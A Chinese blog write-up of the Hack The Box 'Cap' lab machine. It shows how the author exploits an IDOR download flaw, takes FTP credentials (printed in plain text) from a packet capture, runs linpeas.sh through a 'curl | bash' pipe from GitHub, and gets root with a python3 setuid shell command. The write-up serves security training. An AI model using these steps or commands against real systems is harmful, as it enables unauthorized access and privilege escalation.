
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GuijiH6/p/18793627" title="发布于 2025-03-26 13:49">
    <span role="heading" aria-level="2">Hack The Box-Cap靶机</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>该靶机通过信息收集拿到大致信息，利用IDOR访问控制缺陷漏洞获得目标流量包，通过流量分析获取到ftp流量包存在用户名密码，可以ftp登录/ssh登录拿到第一个flag，利用linpeas.sh内网收集工具得到python存在UID提权漏洞，查看ctfobins提权，在/root下发现第二个flag</p>
</blockquote>
<p>靶机信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326102210926.png" alt="" loading="lazy"></p>
<h1 id="一信息收集">一、信息收集</h1>
<p>执行nmap扫描</p>
<pre><code class="language-bash">nmap -sV -sC -O -T4
</code></pre>
<p>开启了21，22，80端口</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326103244402.png" alt="" loading="lazy"></p>
<p>尝试一下<strong>ftp匿名连接</strong>，失败</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326103909115.png" alt="" loading="lazy"></p>
<p>访问80页面</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326104526632.png" alt="" loading="lazy"></p>
<p>查看该面板，有一个下载</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326104614418.png" alt="" loading="lazy"></p>
<p>下载查看是一个流量包文件，分析一下没有可用信息</p>
<p>查看ipconfig面板，是ip信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326104910375.png" alt="" loading="lazy"></p>
<p>查看网络状态信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326104936935.png" alt="" loading="lazy"></p>
<p>在都没有得到可用信息时，在第二个面板下载的时候发现url存在参数</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326105144616.png" alt="" loading="lazy"></p>
<h1 id="二web渗透">二、Web渗透</h1>
<h2 id="idor-访问控制缺陷漏洞">IDOR-访问控制缺陷漏洞</h2>
<p>把下载参数修改为0，发现可以访问下载</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326105320788.png" alt="" loading="lazy"></p>
<p>分析流量包，发现ftp包存在流量信息，拿到用户名密码</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326105433949.png" alt="" loading="lazy"></p>
<p>记录下来</p>
<pre><code class="language-bash"># user：nathan
# passwd：Buck3tH4TF0RM3!
</code></pre>
<p>ftp登录</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326105652111.png" alt="" loading="lazy"></p>
<p>发现一个<strong>user.txt</strong>，<strong>get</strong>下载下来查看，发现第一个flag</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326105724086.png" alt="" loading="lazy"></p>
<p>这里也可用利用上面的账户密码使用ssh登录，因为在访问web服务时，nothan用户是存在的，即可用利用到ssh</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326110122576.png" alt="" loading="lazy"></p>
<h1 id="三提权">三、提权</h1>
<p>查看密码，有bash权限的只有<strong>root和nathan</strong>，看来还是从该用户入手</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326110444319.png" alt="" loading="lazy"></p>
<p>因为有了密码，查看可利用命令，无</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326110454651.png" alt="" loading="lazy"></p>
<p>suid查看一下，没有可以利用的</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326110507517.png" alt="" loading="lazy"></p>
<h2 id="linpeassh-内网自动化信息收集工具">linpeas.sh-内网自动化信息收集工具</h2>
<p>下载地址</p>
<pre><code class="language-php">https://github.com/peass-ng/PEASS-ng/releases/tag/20250320-91fb36a0
</code></pre>
<p>开启web服务，用于上传</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326111212788.png" alt="" loading="lazy"></p>
<p>靶机使用wget命令下载</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326111405192.png" alt="" loading="lazy"></p>
<p>赋予权限然后执行</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326111611786.png" alt="" loading="lazy"></p>
<p>也可以直接从github下载执行</p>
<pre><code class="language-php">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
</code></pre>
<p>最后在此处拿到信息，使用的时候多注意颜色突出的部分，是漏洞利用点</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326112000623.png" alt="" loading="lazy"></p>
<p>在<strong>ctfbbins</strong>上搜索提权方法</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326112142243.png" alt="" loading="lazy"></p>
<p>调用python3执行，成功提权</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326112224595.png" alt="" loading="lazy"></p>
<p>在根目录的root目录下发现flag</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326112257861.png" alt="" loading="lazy"></p>
<p>成功完成</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326112448366.png" alt="" loading="lazy"></p>
<h1 id="四总结">四、总结</h1>
<h2 id="知识点">知识点</h2>
<ul>
<li><strong>IDOR-访问控制漏洞：</strong></li>
<li><strong>linpeas.sh：</strong> 一款内网linux的自动化信息收集工具，还有windows版本的</li>
<li><strong>python提权：</strong> 二进制漏洞利用UID</li>
</ul>
<p><strong>python提权</strong>命令解析</p>
<ul>
<li><strong>python3</strong><br>
执行当前目录下的Python解释器（而非系统默认路径的Python）。</li>
<li><strong>-c</strong><br>
直接执行后续字符串中的Python代码。</li>
<li><strong>os.setuid(0)</strong><br>
尝试将进程的有效用户ID（EUID）设为<strong>0（即root用户）。</strong></li>
<li><strong>os.system("/bin/sh")</strong><br>
启动一个shell（若上一步成功，此shell将具有root权限）。</li>
</ul>
<h2 id="任务1-4">任务1-4</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326112507062.png" alt="" loading="lazy"></p>
<h2 id="任务5-8">任务5-8</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250326112522520.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.02271688925925926" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-26 13:49">2025-03-26 13:49</span>&nbsp;
<a href="https://www.cnblogs.com/GuijiH6">H轨迹H</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18793627" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18793627);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18793627', targetLink: 'https://www.cnblogs.com/GuijiH6/p/18793627', title: 'Hack The Box-Cap靶机' })">举报</a>
</div>
        